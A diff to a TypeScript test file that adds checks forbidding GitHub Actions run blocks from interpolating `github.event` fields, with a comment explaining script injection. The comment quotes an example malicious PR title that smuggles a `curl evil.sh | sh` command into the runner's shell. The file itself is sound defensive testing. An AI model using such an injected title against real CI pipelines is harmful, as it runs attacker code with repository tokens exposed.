@@ -30,7 +30,7 @@ const ACTION = join(dirname(fileURLToPath(import.meta.url)), '../../.github/acti
 if (!existsSync(ACTION)) throw new Error(`FATAL: ${ACTION} is missing`);
 
 interface CompositeAction {
-  runs: { steps: Array<{ name?: string; run?: string; shell?: string }> };
+  runs: { steps: Array<{ name?: string; run?: string; shell?: string; env?: Record<string, string> }> };
 }
 
 const action = load(readFileSync(ACTION, 'utf8')) as CompositeAction;
@@ -65,6 +65,37 @@ describe('composite action shell blocks', () => {
 
   it('declares a shell for every run block', () => {
     expect(runSteps.filter(s => !s.shell)).toEqual([]);
+  });
+
+  // `${{ github.event.* }}` is written by whoever opened the PR. Interpolated into a run
+  // block it is substituted BEFORE bash sees the script, so a PR titled `"; curl evil.sh | sh; #`
+  // executes on the runner with ALIGN_TOKEN in scope. Passed through `env:` it reaches the
+  // shell as a variable's value, which is data. The rule is worth pinning generally rather
+  // than per-field: every member of `github.event` is caller-controlled to some degree.
+  it('never interpolates github.event into a shell block', () => {
+    const offenders = runSteps
+      .filter(s => /\$\{\{\s*github\.event\b/.test(s.run as string))
+      .map(s => s.name ?? `step ${s.index}`);
+
+    expect(offenders).toEqual([]);
+  });
+
+  it('detects the injection pattern when it is present', () => {
+    // Negative control for the check above, which is an emptiness assertion and would pass
+    // just as happily against a regex that matches nothing.
+    const pattern = /\$\{\{\s*github\.event\b/;
+
+    expect(pattern.test('echo "${{ github.event.pull_request.title }}"')).toBe(true);
+  });
+
+  it('supplies the PR title through env, so the check has a title to send', () => {
+    // The other half: proving it is not interpolated is worth nothing if it is also not
+    // passed at all, which would leave `--title` a flag nothing ever sets.
+    const withTitle = action.runs.steps.filter(s => s.env?.PR_TITLE);
+
+    expect(withTitle).toHaveLength(1);
+    expect(withTitle[0]?.env?.PR_TITLE).toContain('github.event.pull_request.title');
+    expect(withTitle[0]?.run).toContain('--title');
   });
 
   it('detects a syntax error when one is present', async () => {
